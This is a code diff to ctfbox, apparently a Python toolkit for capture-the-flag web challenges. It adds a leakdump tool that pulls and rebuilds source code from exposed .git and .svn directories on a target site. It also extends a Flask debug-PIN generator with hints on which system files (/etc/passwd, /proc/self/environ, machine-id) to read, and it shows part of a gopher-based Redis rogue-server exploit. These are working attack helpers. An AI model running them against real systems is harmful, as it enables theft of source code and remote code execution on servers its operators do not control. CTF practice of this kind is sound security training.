@@ -1,3 +1,6 @@
+import os
+import sqlite3
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum
 from functools import partial
 from hashlib import md5 as _md5
@@ -8,22 +11,27 @@ from http.server import HTTPServer
 from itertools import chain
 from json import loads
 from math import ceil
-from os import path
+from os import path, remove
 from queue import Queue
-from re import match
-from threading import Thread, Lock
+from re import match, sub
+from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
+from tempfile import NamedTemporaryFile
+from threading import Lock, Thread
 from time import time
 from typing import Dict, List, Tuple, Union
-from urllib.parse import quote, quote_plus, urljoin
-from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from urllib.parse import quote, quote_plus, urljoin, urlparse
+from zlib import decompress as zlib_decompress
 
 import requests
 import socketio
-from ctfbox.exceptions import (FlaskSessionHelperError, GeneratePayloadError,
-                               HashAuthArgumentError, HttprawError,
-                               ProvideArgumentError, ScanError)
+from ctfbox.exceptions import (DumpError, FlaskSessionHelperError,
+                               GeneratePayloadError, HashAuthArgumentError,
+                               HttprawError, ProvideArgumentError, ScanError)
+from ctfbox.thirdparty.gin import GitParse
 from ctfbox.thirdparty.phpserialize import serialize
-from ctfbox.utils import Context, ProvideHandler, BlindXXEHandler, Threader, random_string
+from ctfbox.utils import (BlindXXEHandler, Context, ProvideHandler, Threader,
+                          random_string)
+from requests.sessions import Session
 
 
 class HashType(Enum):
@@ -144,10 +152,10 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
     """get flask debug pin code.
 
     Args:
-        username (str): username of flask
+        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
         absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
         macAddress (str): mac address,from /sys/class/net/<eth0>/address
-        machineId (str): machine id,from /etc/machine-id
+        machineId (str): machine id,from /proc/self/cgroup first line with string behind /docker/ or /etc/machine-id or /proc/sys/kernel/random/boot_id
         modName (str, optional): mod name.  Defaults to "flask.app".
         appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
 
@@ -1135,7 +1143,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
 
     def RogueServer(ip, port):
         expfp = expFilePath or path.join(path.split(path.realpath(__file__))[
-                                               0], "../", "thirdparty", "redis", "exp.so")
+            0], "../", "thirdparty", "redis", "exp.so")
         with open(expfp, "rb") as f:
             exp = f.read()
 
@@ -1223,3 +1231,239 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
             print("--- exit ---")
         except Exception as e:
             print(f"--- Error: {e} ---")
+
+
+class _BasicDumper(object):
+
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        self.url = url
+        self.outdir = outdir
+        self.targets = []
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"
+        }
+        self.threadNum = threadNum
+        self.lock = Lock()
+        self.session = Session()
+
+    def start(self):
+        self.dump()
+
+    def dump(self):
+        pass
+
+    def download(self, target: tuple):
+        url, filename = target
+
+        # 创建目标目录（filename可能包含部分目录）
+        fullname = os.path.join(self.outdir, filename)
+        outdir = os.path.dirname(fullname)
+        if outdir:
+            if not os.path.exists(outdir):
+                os.makedirs(outdir)
+            elif os.path.isfile(outdir):
+                # 如果之前已经作为文件写入了，则需要删除
+                self.lock.acquire()
+                print(
+                    "Dump warning: %s is a file, it will be replace as a folder" % outdir)
+                self.lock.release()
+                os.remove(outdir)
+                os.makedirs(outdir)
+
+        # 获取数据
+        status, data = self.fetch(url)
+        if status != 200 or data is None:
+            # None才代表出错，data可能为b""
+            raise DumpError("Fetch file error: [%s] %s %s" % (status, url, filename))
+        self.lock.acquire()
+        print("[%s] %s %s" % (status, url, filename))
+        self.lock.release()
+
+        # 处理数据（如有必要）
+        data = self.convert(data)
+
+        # 保存数据
+        try:
+            with open(fullname, "wb") as f:
+                f.write(data)
+        except IsADirectoryError:
+            # 多协程/线程/进程下，属于正常情况
+            pass
+        except Exception as e:
+            self.lock.acquire()
+            print("Dump error: %s %s" % (url, filename))
+            print(str(e.args))
+            self.lock.release()
+
+    def convert(self, data: bytes) -> bytes:
+        """ 处理数据 """
+        return data
+
+    def fetch(self, url: str, times: int = 3) -> tuple:
+        """ 从URL获取内容，如果失败默认重试三次 """
+        # # TODO：下载大文件需要优化
+        s = self.session
+        while times:
+            try:
+                res = s.get(url, headers=self.headers)
+                ret = (res.status_code, res.content)
+                return ret
+            except Exception:
+                times -= 1
+        return (0, None)
+
+    def startPool(self):
+        with ThreadPoolExecutor(max_workers=self.threadNum) as pool:
+            tasks = [pool.submit(self.download, target) for target in self.targets]
+            for task in as_completed(tasks):
+                err = task.exception()
+                if err:
+                    if isinstance(err, DumpError):
+                        print("Dump error: %s" % err)
+                    else:
+                        raise err
+
+    def parse(self, url: str):
+        """ 从URL下载文件并解析 """
+        pass
+
+    def indexfile(self, url: str) -> NamedTemporaryFile:
+        """ 创建一个临时索引文件index/wc.db """
+        idxfile = NamedTemporaryFile(delete=False)
+        status, data = self.fetch(url)
+        if not data:
+            raise DumpError("Fetch index file error")
+        with open(idxfile.name, "wb") as f:
+            f.write(data)
+        return idxfile
+
+
+class _GitDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_GitDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub(".git.*", ".git", url)
+
+    def start(self):
+        """ 入口方法 """
+        self.dump()
+
+    def dump(self):
+        try:
+            idxFile = self.indexfile(self.base_url + "/index")
+            for entry in GitParse(idxFile.name):
+                if "sha1" in entry.keys():
+                    sha1 = entry.get("sha1", "").strip()
+                    filename = entry.get("name", "").strip()
+                    if not sha1 or not filename:
+                        continue
+                    targetUrl = "%s/objects/%s/%s" % (self.base_url, sha1[:2], sha1[2:])
+                    self.targets.append((targetUrl, filename))
+            self.startPool()
+        finally:
+            os.remove(idxFile.name)
+
+    def convert(self, data: bytes) -> bytes:
+        """ 用zlib对数据进行解压 """
+        if data:
+            try:
+                data = zlib_decompress(data)
+                # Bytes正则匹配
+                data = sub(rb"blob \d+\x00", b"", data)
+            except Exception as e:
+                print("Dump error: %s " % str(e.args))
+        return data
+
+
+class _SvnDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_SvnDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub(".svn.*", ".svn", url)
+
+    def start(self):
+        """ dumper入口方法 """
+        entries_url = self.base_url + "/entries"
+        status, data = self.fetch(entries_url)
+        if not data:
+            raise DumpError("Fetch entries file error")
+        if data == b"12\n":
+            self.dump()
+        else:
+            # TODO: 针对svn1.7以前的版本
+            print("DUMP LEGACY... TODO", fg="yellow")
+            self.dump_legacy()
+
+    def dump(self):
+        try:
+            """ 针对svn1.7以后的版本 """
+            # 创建一个临时文件用来存储wc.db
+            idxfile = self.indexfile(self.base_url + "/wc.db")
+            # 从wc.db中解析URL和文件名
+            for item in self.parse(idxfile.name):
+                sha1, filename = item
+                if not sha1 or not filename:
+                    continue
+                url = "%s/pristine/%s/%s.svn-base" % (self.base_url, sha1[6:8], sha1[6:])
+                self.targets.append((url, filename))
+            idxfile.close()
+            self.startPool()
+        finally:
+            remove(idxfile.name)
+
+    def dump_legacy(self):
+        """ 针对svn1.7以前的版本 """
+        pass
+
+    def parse(self, filename: str) -> list:
+        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
+        try:
+            conn = sqlite3.connect(filename)
+            cursor = conn.cursor()
+            cursor.execute("select checksum, local_relpath from NODES")
+            items = cursor.fetchall()
+            cursor.execute("select checksum, substr(md5_checksum,7) from PRISTINE")
+            items.extend(cursor.fetchall())
+            newitems = []
+            checksumList = []
+            for item in items:
+                if (item[0]) not in checksumList:
+                    checksumList.append(item[0])
+                    newitems.append(item)
+            conn.close()
+            return newitems
+        except Exception as e:
+            raise DumpError("Sqlite connection failed") from e
+
+
+def leakdump(url: str, outputDir: str = ""):
+    """A function for source code leaks, support .git .svn
+
+    Origin:
+        https://github.com/0xHJK/dumpall
+
+    Args:
+        url (str): the target url.
+        outputDir (str, optional): Output directory. Defaults to ./{hostname}.
+
+    Raises:
+        DumpError
+
+    Example:
+        leakdump("http://example.com/.git")
+    """
+
+    url = url.rstrip("/")
+    if not outputDir:
+        parsed_url = urlparse(url)
+        outputDir = path.join("./", parsed_url.hostname)
+    availiable_endswith = [".git", ".svn"]
+    if not any(ends for ends in availiable_endswith if url.endswith(ends)):
+        raise DumpError("Not availiable url")
+
+    if url.endswith(".git"):
+        dumper = _GitDumper(urljoin(url, ".git"), outputDir)
+        dumper.start()
+
+    if url.endswith(".svn"):
+        dumper = _SvnDumper(urljoin(url, ".svn"), outputDir)
+        dumper.start()
